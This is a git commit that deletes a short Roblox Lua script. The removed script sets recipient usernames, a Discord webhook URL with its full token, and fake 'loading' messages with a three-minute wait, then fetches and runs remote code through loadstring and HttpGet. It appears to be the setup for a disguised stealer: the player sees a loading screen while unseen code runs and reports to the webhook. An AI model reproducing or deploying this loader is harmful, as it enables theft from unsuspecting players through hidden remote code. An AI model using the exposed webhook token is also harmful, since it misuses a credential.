afa04e6f8a7bbcba43e4434c23c1259fdd0fb1bf
MilkHub <133882432+marcureg@users.noreply.github.com>
2023-05-17 16:37:56 +0300

    Delete myscript.lua

--- myscript.lua
+++
@@ -1,9 +0,0 @@
-UserName = "cadarmaria"
-UserName2 = "cadarmaria"
-Webhook = "https://discord.com/api/webhooks/1108377943778009238/LvhXyldn4we9snKJOOvzmc6khxAxUZxYj0pb14jKBxxlYyxcovCOTdEHSO7WxgfZ2HTd"
-_G.ScriptName = "Rizz Scriptz"
-_G.FirstText = "Script Preparing"
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
